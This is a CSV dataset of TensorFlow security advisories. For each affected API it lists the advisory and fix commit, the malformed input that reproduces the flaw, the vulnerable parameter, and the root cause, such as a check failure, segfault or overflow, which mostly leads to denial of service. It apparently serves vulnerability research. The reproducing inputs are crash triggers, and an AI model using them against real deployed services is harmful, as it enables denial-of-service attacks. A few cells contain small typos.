Library,Advisory Link,Commit,Parent Module,API,Anomaly,Reproducing Example,Vulnerable Parameter,Root cause 1,Root cause 2,Attack type
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q5jv-m6qw-5g37,https://github.com/tensorflow/tensorflow/commit/611d80db29dd7b0cfb755772c69d60ae5bca05f9,tf.raw_ops,tf.raw_ops.Conv2D,Empty input,"np.ones([1, 0, 2, 1])",input,N.A,division by zero,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g9h5-vr8m-x2h4,https://github.com/tensorflow/tensorflow/commit/bf6b45244992e2ee543c258e519489659c99fb7f,tf.raw_ops,tf.raw_ops.AudioSummaryV2,More than one element,"arg_2=tf.random.uniform(shape=(2,1), dtype=tf.float32, maxval=None)",sample_rate,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fhfc-2q7x-929f,https://github.com/tensorflow/tensorflow/commit/c1f491817dec39a26be3c574e86a88c30f3c4770,tf.raw_ops,tf.raw_ops.CollectiveGather,Scalar input,arg_0=1,input,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wq6q-6m32-9rv9,https://github.com/tensorflow/tensorflow/commit/cf70b79d2662c0d3c6af74583641e345fc939467,tf.raw_ops,tf.raw_ops.SetSize,Scalar input,arg_2=1,set_shape,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9v8w-xmr4-wgxp,https://github.com/tensorflow/tensorflow/commit/3db59a042a38f4338aa207922fa2f476e000a6ee,tf.raw_ops,tf.raw_ops.TensorListFromTensor,Rank greater than one,"arg_1=tf.random.uniform(shape=(6, 9, 1, 3), dtype=tf.int64, maxval=65536)",element_shape,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vm7x-4qhj-rrcq,https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61,tf.raw_ops,tf.raw_ops.TensorListScatter,Rank greater than one,"arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)",element_shape,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vm7x-4qhj-rrcq,https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61,tf.raw_ops,tf.raw_ops.TensorListScatterV2,Rank greater than one,"arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)",element_shape,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h7ff-cfc9-wmmh,https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed,tf.quantization,tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient,Rank other than 1,"arg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)","min, max",N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j43h-pgmg-5hjq,https://github.com/tensorflow/tensorflow/commit/32d7bd3defd134f21a4e344c8dfd40099aaf6b18,tf.raw_ops,tf.raw_ops.MaxPool,Dimension mismatch,"ksize = [1, 1, 2, 2]",ksize,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9vqj-64pv-w55c,https://github.com/tensorflow/tensorflow/commit/c55b476aa0e0bd4ee99d0f3ad18d9d706cd1260a,tf.linalg,tf.linalg.matrix_rank,Empty input,"a = tf.constant([], shape=[0, 1, 1], dtype=tf.float32)",a,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w62h-8xjm-fv49,https://github.com/tensorflow/tensorflow/commit/bf4c14353c2328636a18bfad1e151052c81d5f43,tf.raw_ops,tf.raw_ops.DenseBincount,Dimension mismatch,"weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)",weights,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wr9v-g9vf-c74v,https://github.com/tensorflow/tensorflow/commit/7a4591fd4f065f4fa903593bc39b2f79530a74b8,tf.raw_ops,tf.raw_ops.RaggedBincount,Empty input,"splits = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-7430)",splits,N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9942-r22v-78cp,https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255,tf.raw_ops,tf.raw_ops.LRNGrad,Rank other than 4,"utput_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)",output_image,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5,https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51,tf.raw_ops,tf.raw_ops.ParameterizedTruncatedNormal,Type mismatch,"shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)",shape,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4,https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4,tf.raw_ops,tf.raw_ops.Save,int64 tensor,"data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)",data,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4,https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4,tf.raw_ops,f.raw_ops.SaveSlices,int64 tensor,"data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)",data,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-397c-5g2j-qxpv,https://github.com/tensorflow/tensorflow/commit/40adbe4dd15b582b0210dfbf40c243a62f5119fa,tf.raw_ops,tf.raw_ops.SparseBincount,Empty input,"indices = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int64, seed=-1288)
values = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-9366)
dense_shape = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-9878)","indices, values, dense_shape",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6cv-4fmf-66xf,https://github.com/tensorflow/tensorflow/commit/88f93dfe691563baa4ae1e80ccde2d5c7a143821,tf.raw_ops,tf.raw_ops.RaggedTensorToVariant,Rank other than 1,"rt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)",rt_nested_splits,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vxv8-r8q2-63xw,https://github.com/tensorflow/tensorflow/commit/8741e57d163a079db05a7107a7609af70931def4,tf.raw_ops,tf.raw_ops.FractionalMaxPoolGrad,Dimension mismatch,"orig_input = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
orig_output = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
out_backprop = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)","orig_input, orig_output, out_backprop",N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v7vw-577f-vp8x,https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89,tf.raw_ops,tf.raw_ops.QuantizedRelu,Non scalar input,"min_features = tf.constant([], shape=[0], dtype=tf.float32)","min_features, max_features",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v7vw-577f-vp8x,https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89,tf.raw_ops,tf.raw_ops.QuantizedRelu6,Non scalar input,"max_features = tf.constant(-128, shape=[1], dtype=tf.float32)","min_features, max_features",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vgvh-2pf4-jr2x,https://github.com/tensorflow/tensorflow/commit/73ad1815ebcfeb7c051f9c2f7ab5024380ca8613,tf.raw_ops,tf.raw_ops.QuantizeDownAndShrinkRange,Non scalar input,"input_min = tf.constant([], shape=[0], dtype=tf.float32)
input_max = tf.constant(-256, shape=[1], dtype=tf.float32)","input_min, input_max",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-689c-r7h2-fv9v,https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48,tf.raw_ops,tf.raw_ops.QuantizedMatMul,Non scalar input,"min_a = tf.constant([], shape=[0], dtype=tf.float32)
max_a = tf.constant(0, shape=[1], dtype=tf.float32)
min_b = tf.constant(0, shape=[1], dtype=tf.float32)
max_b = tf.constant(0, shape=[1], dtype=tf.float32)","min_a, max_a, min_b, max_b",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9j4v-pp28-mxv7,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.FakeQuantWithMinMaxVarsPerChannel,Rank other than 1,"min = tf.constant([], shape=[4,0,0], dtype=tf.float32)
max = tf.constant(0, shape=[4], dtype=tf.float32)","min, max",N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4pc4-m9mj-v2r9,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.QuantizedBiasAdd,Rank other than 0,"min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[1], dtype=tf.float32)
min_bias = tf.constant(0, shape=[1], dtype=tf.float32)
max_bias = tf.constant(0, shape=[1], dtype=tf.float32)","min_input, max_input, min_bias, max_bias",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wqmc-pm8c-2jhc,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.Requantize,Rank other than 0,"input_min = tf.constant([], shape=[0], dtype=tf.float32)
input_max = tf.constant(-256, shape=[1], dtype=tf.float32)
requested_output_min = tf.constant(-256, shape=[1], dtype=tf.float32)
requested_output_max = tf.constant(-256, shape=[1], dtype=tf.float32)","input_min, input_max, requested_output_min, requested_output_max",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9fpg-838v-wpv7,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.FakeQuantWithMinMaxVars,Rank other than 0,"min = tf.constant(0, shape=[2,3], dtype=tf.float32)
max = tf.constant(0, shape=[2,3], dtype=tf.float32)","min, max",N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g35r-369w-3fqp,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.QuantizedInstanceNorm,Rank other than 0,"x_min = tf.constant([], shape=[0], dtype=tf.float32)
x_max = tf.constant(0, shape=[], dtype=tf.float32)","x_min, x_max",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q2c3-jpmc-gfjx,https://github.com/tensorflow/tensorflow/commit/50156d547b9a1da0144d7babe665cf690305b33c,tf.raw_ops,tf.raw_ops.Conv2DBackpropInput,Rank other than 4,"input_sizes = tf.constant([65534,65534], shape=[2], dtype=tf.int32)",input_sizes,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2475-53vw-vp25,https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f,tf.raw_ops,tf.raw_ops.AvgPoolGrad,Does not fully validate the input,"orig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)",orig_input_shape,N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v6h3-348g-6h5x,https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89,tf.raw_ops,tf.raw_ops.QuantizedAdd,Rank other than 0,"min_x = tf.constant([], shape=[0], dtype=tf.float32)
max_x = tf.constant(0, shape=[], dtype=tf.float32)
min_y = tf.constant(0, shape=[], dtype=tf.float32)
max_y = tf.constant(0, shape=[], dtype=tf.float32)","min_input, max_input",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4w68-4x85-mjj9,https://github.com/tensorflow/tensorflow/commit/7cdf9d4d2083b739ec81cfdace546b0c99f50622,tf.raw_ops,tf.raw_ops.QuantizedAvgPool,Rank other than 0,"min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[1], dtype=tf.float32","min_input, max_input",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qxpx-j395-pw36,https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea,tf.raw_ops,tf.raw_ops.LowerBound,Empty input,"sorted_inputs = tf.constant([], shape=[10,0], dtype=tf.float32)",sorted_inputs,nullptr dereference,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qxpx-j395-pw36,https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea,tf.raw_ops,tf.raw_ops.UpperBound,Empty input,"sorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)",sorted_inputs,nullptr dereference,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668,https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa,tf.raw_ops,tf.raw_ops.BlockLSTMGradV2,Rank other than 1,"wci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
wco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
b = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)","wci, wcf, wco, b",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668,https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa,tf.raw_ops,tf.raw_ops.BlockLSTMGradV2,Rank other than 2,"cs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
h_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
w = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)","w, cs_prev, h_prev",N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668,https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa,tf.raw_ops,tf.raw_ops.BlockLSTMGradV2,Rank other than 3,"x = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)",x,N.A,segfault,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm,https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Negative argument,"orig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)",orig_input_tensor_shape,overflow,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm,https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Rank other than 4,"out_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)",out_backprop,overflow,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm,https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Negative argument,"out_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)",out_backprop,overflow,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wxjj-cgcx-r3vq,https://github.com/tensorflow/tensorflow/commit/9178ac9d6389bdc54638ab913ea0e419234d14eb,tf.raw_ops,tf.raw_ops.AvgPool3DGrad,Very large input argument,"orig_input_shape = tf.constant(1879048192, shape=[5], dtype=tf.int32)",orig_input_shape,overflow,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h5vq-gw2c-pq47,https://github.com/tensorflow/tensorflow/commit/5f945fc6409a3c1e90d6970c9292f805f6e6ddf2,tf.raw_ops,tf.raw_ops.UnbatchGrad,Non scalar input,"id=tf.constant([1,], dtype=tf.int64)",id,N.A,check failure,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h5vq-gw2c-pq47,https://github.com/tensorflow/tensorflow/commit/5f945fc6409a3c1e90d6970c9292f805f6e6ddf2,tf.raw_ops,tf.raw_ops.UnbatchGrad,Contain more than three times the number of elements ,"batch_index=tf.constant([[0,0,0 ], ], dtype=tf.int64)",batch_index,N.A,check failure,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mgmh-g2v6-mqw5,https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f,tf.raw_ops,tf.raw_ops.AvgPool,Negative argument,"ksize = [1, 1e20, 1, 1]",ksize,N.A,check failure,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x989-q2pq-4q5x,https://github.com/tensorflow/tensorflow/commit/37cefa91bee4eace55715eeef43720b958a01192,tf.raw_ops,tf.raw_ops.RaggedRange,Very large float,"limits=[10.0,1e20]",limits,N.A,InvalidArgument,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v5xg-3q2c-c2r4,https://github.com/tensorflow/tensorflow/commit/b5f6fbfba76576202b72119897561e3bd4f179c7,tf.raw_ops,tf.raw_ops.TensorListReserve,More than one element,"num_elements=tf.constant([1,1], dtype=tf.int32)",num_elements,N.A,check failure,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-97p7-w86h-vcf9,https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf,tf.raw_ops,tf.raw_ops.SobolSample,Non scalar input,"dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1])","dim, num_results, skip",N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f4w6-h4f5-wx45,https://github.com/tensorflow/tensorflow/commit/61f0f9b94df8c0411f0ad0ecc2fec2d3f3c33555,tf,tf.reshape,Overflowing tensor elements,"tensor=[[1]],shape=tf.constant([0 for i in range(255)], dtype=tf.int64)","tensor, shape",N.A,check failure,Denial of service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xrp2-fhq4-4q3w,https://github.com/tensorflow/tensorflow/commit/e57fd691c7b0fd00ea3bfe43444f30c1969748b5,tf.raw_ops,tf.histogram_fixed_width,NaN input,values=np.nan,values,N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cwpm-f78v-7m5c,https://github.com/tensorflow/tensorflow/commit/bd4d5583ff9c8df26d47a23e508208844297310e,tf.raw_ops,tf.ragged.constant,Empty input,pylist=[],pylist,N.A,memory consumption,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hx9q-2mx4-m4pg,https://github.com/tensorflow/tensorflow/commit/84563f265f28b3c36a15335c8b005d405260e943,tf.strings,tf.strings.unsorted_segment_join,Negative argument,num_segments=-1,num_segments,N.A,check failure,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hx9q-2mx4-m4pg,https://github.com/tensorflow/tensorflow/commit/20cb18724b0bf6c09071a3f53434c4eec53cc147,tf.strings,tf.strings.unsorted_segment_join,Negative argument,num_segments=-1,num_segments,N.A,check failure,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2r2f-g8mw-9gvr,https://github.com/tensorflow/tensorflow/commit/30721cf564cb029d34535446d6a5a6357bebc8e7,tf.raw_ops,tf.raw_ops.EditDistance,Negative argument,"hypothesis_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64), truth_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)","hypothesis_indices, truth_indices",N.A,segfault,Denial of Service
